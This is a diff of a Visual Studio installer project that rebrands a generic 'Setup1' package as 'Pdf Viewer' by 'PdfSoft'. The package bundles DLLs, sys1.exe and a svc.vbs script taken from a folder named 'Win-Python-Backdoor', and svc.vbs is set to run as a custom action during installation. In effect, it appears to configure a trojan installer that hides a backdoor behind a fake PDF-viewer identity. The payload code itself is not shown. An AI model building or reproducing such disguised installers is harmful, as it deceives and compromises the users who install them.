@@ -3,7 +3,7 @@
 "VSVersion" = "3:800"
 "ProjectType" = "8:{978C614F-708E-4E1A-B201-565925725DBA}"
 "IsWebType" = "8:FALSE"
-"ProjectName" = "8:Setup1"
+"ProjectName" = "8:Pdf Viewer"
 "LanguageId" = "3:1033"
 "CodePage" = "3:1252"
 "UILanguageId" = "3:1033"
@@ -16,12 +16,6 @@
         "Entry"
         {
         "MsmKey" = "8:_10A9C8793F42483EA62741ED8E831159"
-        "OwnerKey" = "8:_UNDEFINED"
-        "MsmSig" = "8:_UNDEFINED"
-        }
-        "Entry"
-        {
-        "MsmKey" = "8:_1698D21395A34FF7A0572208D784522B"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -46,6 +40,12 @@
         "Entry"
         {
         "MsmKey" = "8:_E7978D7D402B4788BF79FAAE1E211254"
+        "OwnerKey" = "8:_UNDEFINED"
+        "MsmSig" = "8:_UNDEFINED"
+        }
+        "Entry"
+        {
+        "MsmKey" = "8:_F3A381D96FAC4BDEAC0C6698BED9B679"
         "OwnerKey" = "8:_UNDEFINED"
         "MsmSig" = "8:_UNDEFINED"
         }
@@ -74,6 +74,14 @@
             "PrerequisitesLocation" = "2:1"
             "Url" = "8:"
             "ComponentsUrl" = "8:"
+                "Items"
+                {
+                    "{EDC2488A-8267-493A-A98E-7D9C3B36CDF3}:.NETFramework,Version=v4.6.1"
+                    {
+                    "Name" = "8:Microsoft .NET Framework 4.6.1 (x86 and x64)"
+                    "ProductCode" = "8:.NETFramework,Version=v4.6.1"
+                    }
+                }
             }
         }
         "Release"
@@ -81,7 +89,7 @@
         "DisplayName" = "8:Release"
         "IsDebugOnly" = "11:FALSE"
         "IsReleaseOnly" = "11:TRUE"
-        "OutputFilename" = "8:Release\\Setup1.msi"
+        "OutputFilename" = "8:Release\\PdfViewer.msi"
         "PackageFilesAs" = "3:2"
         "PackageFileSize" = "3:-2147483648"
         "CabType" = "3:1"
@@ -127,17 +135,17 @@
             "InstallerClass" = "11:FALSE"
             "CustomActionData" = "8:"
             }
-            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_CE31FD9E62CD46FCA6877A8DB08D6E73"
+            "{4AA51A2D-7D85-4A59-BA75-B0809FC8B380}:_DAAF554306B0475E843BDECC6BD652FF"
             {
             "Name" = "8:svc.vbs"
             "Condition" = "8:"
-            "Object" = "8:_1698D21395A34FF7A0572208D784522B"
+            "Object" = "8:_F3A381D96FAC4BDEAC0C6698BED9B679"
             "FileType" = "3:4"
             "InstallAction" = "3:1"
             "Arguments" = "8:"
             "EntryPoint" = "8:"
             "Sequence" = "3:2"
-            "Identifier" = "8:_61B43B87_ADCE_45A9_9DB8_4EBBF2371279"
+            "Identifier" = "8:_B79458BE_E734_4442_A2D4_8136E3263DEA"
             "InstallerClass" = "11:FALSE"
             "CustomActionData" = "8:"
             }
@@ -158,28 +166,8 @@
         {
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_10A9C8793F42483EA62741ED8E831159"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\GitHub\\Win-Python-Backdoor\\libcurl.dll"
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libcurl.dll"
             "TargetName" = "8:libcurl.dll"
-            "Tag" = "8:"
-            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
-            "Condition" = "8:"
-            "Transitive" = "11:FALSE"
-            "Vital" = "11:TRUE"
-            "ReadOnly" = "11:FALSE"
-            "Hidden" = "11:FALSE"
-            "System" = "11:FALSE"
-            "Permanent" = "11:TRUE"
-            "SharedLegacy" = "11:FALSE"
-            "PackageAs" = "3:1"
-            "Register" = "3:1"
-            "Exclude" = "11:FALSE"
-            "IsDependency" = "11:FALSE"
-            "IsolateTo" = "8:"
-            }
-            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_1698D21395A34FF7A0572208D784522B"
-            {
-            "SourcePath" = "8:..\\..\\..\\..\\svc.vbs"
-            "TargetName" = "8:svc.vbs"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
             "Condition" = "8:"
@@ -198,7 +186,7 @@
             }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_5A8565E3FE8845C0B72ED8BE3087FF61"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\GitHub\\Win-Python-Backdoor\\libcrypto-1_1.dll"
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libcrypto-1_1.dll"
             "TargetName" = "8:libcrypto-1_1.dll"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
@@ -218,7 +206,7 @@
             }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_7761847E16684DDE84B82ABE1D7B349C"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\GitHub\\Win-Python-Backdoor\\sys1.dll"
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\sys1.dll"
             "TargetName" = "8:sys1.dll"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
@@ -238,7 +226,7 @@
             }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_83A8D650AF654ED1BCE57A1A31342EAD"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\GitHub\\Win-Python-Backdoor\\libssl-1_1.dll"
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\libssl-1_1.dll"
             "TargetName" = "8:libssl-1_1.dll"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
@@ -258,7 +246,7 @@
             }
             "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_E7978D7D402B4788BF79FAAE1E211254"
             {
-            "SourcePath" = "8:..\\..\\..\\..\\GitHub\\CppWindowsService\\C++\\Release\\sys1.exe"
+            "SourcePath" = "8:..\\..\\C++\\Release\\sys1.exe"
             "TargetName" = "8:sys1.exe"
             "Tag" = "8:"
             "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
@@ -269,6 +257,26 @@
             "Hidden" = "11:FALSE"
             "System" = "11:FALSE"
             "Permanent" = "11:TRUE"
+            "SharedLegacy" = "11:FALSE"
+            "PackageAs" = "3:1"
+            "Register" = "3:1"
+            "Exclude" = "11:FALSE"
+            "IsDependency" = "11:FALSE"
+            "IsolateTo" = "8:"
+            }
+            "{1FB2D0AE-D3B9-43D4-B9DD-F88EC61E35DE}:_F3A381D96FAC4BDEAC0C6698BED9B679"
+            {
+            "SourcePath" = "8:..\\..\\..\\Win-Python-Backdoor\\svc.vbs"
+            "TargetName" = "8:svc.vbs"
+            "Tag" = "8:"
+            "Folder" = "8:_874313CFE00D47A38FF8C89B81B916DD"
+            "Condition" = "8:"
+            "Transitive" = "11:FALSE"
+            "Vital" = "11:TRUE"
+            "ReadOnly" = "11:FALSE"
+            "Hidden" = "11:FALSE"
+            "System" = "11:FALSE"
+            "Permanent" = "11:FALSE"
             "SharedLegacy" = "11:FALSE"
             "PackageAs" = "3:1"
             "Register" = "3:1"
@@ -342,22 +350,22 @@
         "Product"
         {
         "Name" = "8:Microsoft Visual Studio"
-        "ProductName" = "8:Setup1"
-        "ProductCode" = "8:{49168414-9A56-45D3-A4BC-617FD19511D7}"
-        "PackageCode" = "8:{2A4AA563-3196-4038-8351-A8C2080C5622}"
+        "ProductName" = "8:Pdf Viewer"
+        "ProductCode" = "8:{5A983143-6419-4883-9234-CFDE07F22AE5}"
+        "PackageCode" = "8:{0FDE3CC5-F38D-4AE2-BBB5-F3D33DEBA142}"
         "UpgradeCode" = "8:{C3C953E8-4B5D-4005-9499-3D2A2CF54F8C}"
         "AspNetVersion" = "8:4.0.30319.0"
         "RestartWWWService" = "11:FALSE"
-        "RemovePreviousVersions" = "11:FALSE"
+        "RemovePreviousVersions" = "11:TRUE"
         "DetectNewerInstalledVersion" = "11:TRUE"
         "InstallAllUsers" = "11:FALSE"
-        "ProductVersion" = "8:1.0.0"
-        "Manufacturer" = "8:Default Company Name"
+        "ProductVersion" = "8:1.0.1"
+        "Manufacturer" = "8:PdfSoft"
         "ARPHELPTELEPHONE" = "8:"
         "ARPHELPLINK" = "8:"
-        "Title" = "8:Setup1"
+        "Title" = "8:Pdf Viewer"
         "Subject" = "8:"
-        "ARPCONTACT" = "8:Default Company Name"
+        "ARPCONTACT" = "8:PdfSoft"
         "Keywords" = "8:"
         "ARPCOMMENTS" = "8:"
         "ARPURLINFOABOUT" = "8:"
